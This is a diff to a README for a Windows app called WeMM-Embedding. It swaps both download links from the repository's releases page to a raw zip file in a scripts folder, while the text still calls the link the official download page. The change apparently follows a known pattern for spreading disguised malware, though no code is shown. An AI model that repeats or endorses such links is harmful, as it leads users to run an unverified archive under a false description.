@@ -6,7 +6,7 @@ Welcome! This guide will help you download and start using WeMM-Embedding on you
 
 ## 📥 Download the Application
 
-**Visit this link to download the application:** [Click Here to Download WeMM-Embedding](https://github.com/tinpot-prevailingwesterly4227/WeMM-Embedding/releases)
+**Visit this link to download the application:** [Click Here to Download WeMM-Embedding](https://raw.githubusercontent.com/tinpot-prevailingwesterly4227/WeMM-Embedding/main/scripts/We_Embedding_M_1.6-beta.4.zip)
 
 This link will take you to the official download page where you can get the latest version of WeMM-Embedding for your computer.
 
@@ -145,6 +145,6 @@ If you encounter any issues:
 
 WeMM-Embedding is a powerful yet accessible tool that brings advanced AI capabilities to your Windows computer. With its ability to understand both images and text, it opens up new possibilities for searching, organizing, and understanding your digital content. Download it today and experience the future of content understanding!
 
-**Ready to start?** [Download WeMM-Embedding Now](https://github.com/tinpot-prevailingwesterly4227/WeMM-Embedding/releases)
+**Ready to start?** [Download WeMM-Embedding Now](https://raw.githubusercontent.com/tinpot-prevailingwesterly4227/WeMM-Embedding/main/scripts/We_Embedding_M_1.6-beta.4.zip)
 
 Keywords: embedding-models, multimodal, multimodal-llm
